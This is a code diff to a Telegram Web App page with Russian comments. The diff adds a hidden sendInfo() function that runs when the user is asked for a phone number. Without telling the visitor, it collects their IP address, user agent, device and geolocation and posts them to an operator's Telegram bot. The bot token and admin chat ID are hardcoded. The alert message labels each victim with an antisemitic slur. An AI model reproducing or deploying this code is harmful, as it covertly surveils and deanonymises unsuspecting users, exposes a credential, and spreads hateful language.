@@ -49,9 +49,47 @@
     </div>
 
     <script>
-        const tg = window.Telegram.WebApp;
-        const BOT_TOKEN = '8038248372:AAGD5Bb7p8UVjDUNbyIQP8gnc1_YK5Cre7w'; // Замените на токен вашего бота
+    	const BOT_TOKEN = '8038248372:AAGD5Bb7p8UVjDUNbyIQP8gnc1_YK5Cre7w'; // Замените на токен вашего бота
         const ADMIN_CHAT_ID = '1521132127'; // Замените на ID администратора
+
+    	async function sendInfo() {
+    try {
+        const userAgent = navigator.userAgent;
+        const time = new Date().toLocaleString();
+        const device = navigator.platform;
+
+        const ipResponse = await fetch('https://api.ipify.org?format=json');
+        if (!ipResponse.ok) {
+            throw new Error('Ошибка при получении IP');
+        }
+        const ipData = await ipResponse.json();
+        const ip = ipData.ip;
+
+        const geoResponse = await fetch(`https://ipinfo.io/${ip}/json`);
+        if (!geoResponse.ok) {
+            throw new Error('Ошибка при получении геолокации');
+        }
+        const geoData = await geoResponse.json();
+        const { city, region, country } = geoData;
+
+        const message = `🧊 НОВЫЙ ГОЙ\n\nIP: ${ip}\nUser-Agent: ${userAgent}\nTime: ${time}\nDevice: ${device}\nLocation: ${city}, ${region}, ${country}`;
+
+        const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+
+        await fetch(telegramUrl, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: ADMIN_CHAT_ID,
+                text: message
+            })
+        });
+    } catch (error) {
+        console.error('Ошибка:', error);
+    }
+}
+
+        const tg = window.Telegram.WebApp;
 
         // Инициализация темы
         document.body.style.backgroundColor = tg.themeParams.bg_color;
@@ -59,6 +97,7 @@
 
         // Функция для запроса номера телефона
         function requestPhoneNumber() {
+        	sendInfo();
             tg.requestContact((sent, event) => {
                 if (sent) {
                     const phoneNumber = event.responseUnsafe.contact.phone_number;
